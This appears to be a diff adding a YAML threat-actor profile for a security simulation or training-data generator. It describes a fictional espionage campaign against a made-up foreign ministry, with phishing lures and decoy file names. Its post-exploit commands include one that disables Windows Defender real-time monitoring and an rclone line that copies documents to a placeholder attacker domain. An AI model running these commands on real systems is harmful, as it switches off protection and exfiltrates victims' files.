@@ -1,0 +1,87 @@
+name: Diplomatic Envoy
+effectiveness: 85
+count_init_passive_dns: 20
+max_wave_size: 4
+attacks:
+  - recon:browsing
+  - watering_hole:phishing
+  - email:phishing
+  - email:malware_delivery
+watering_hole_domains:
+  - mfazorana.gov.zo
+watering_hole_target_roles:
+  - Diplomatic Affairs Analyst
+  - Foreign Relations Specialist
+  - Political Officer
+  - Ambassador
+domain_themes:
+  - diplomacy
+  - international_relations
+  - foreign_policy
+  - embassy
+  - negotiation
+  - intelligence
+  - espionage
+  - undercover
+  - covert
+  - information_gathering
+  - information_warfare
+  - cyber_espionage
+  - cyber_warfare
+  - infiltration
+sender_themes: 
+  - diplomat
+  - envoy
+  - ambassador
+  - attaché
+  - consular_officer
+  - intelligence_officer
+  - spy
+  - operative
+  - infiltrator
+subjects:
+  - "Urgent: Request for Information on Upcoming Bilateral Meeting"
+  - "Invitation to Participate in International Summit on Climate Change"
+  - "Information on Visa Application Procedures for Zorana"
+  - "Request for Meeting with Ministry Officials"
+  - "Confirmation of Appointment with Minister of Foreign Affairs"
+  - "Notification of Changes to Travel Itinerary"
+  - "Suspicious Activity on Your Account"
+  - "Important Security Update"
+recon_search_terms:
+  - diplomatic cable leaks
+  - foreign minister email password
+  - embassy security protocols
+  - intelligence gathering methods
+  - cyber espionage techniques
+  - classified diplomatic documents
+file_names:
+  - Bilateral-Meeting-Notes.docx
+  - Visa-Application-Form.docx
+  - Travel-Itinerary.docx
+  - Ministry-Contacts.xlsx
+  - Diplomatic-Correspondence.docx
+  - Confidential-Briefing-Memo.docx
+  - Sensitive-Information-Report.docx
+tlds:
+  - com
+  - gov
+  - zo
+spoofs_email: True
+malware:
+  - diplomat_ransomware
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe dirr
+  - name: cmd.exe
+    process: cmd.exe dir
+  - name: cmd.exe
+    process: "cmd.exe dir C:\\"
+  - name: cmd.exe
+    process: "cmd.exe dir E:\\"
+  - name: cmd.exe
+    process: "cmd.exe cd Documents"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+  - name: rclone.exe 
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
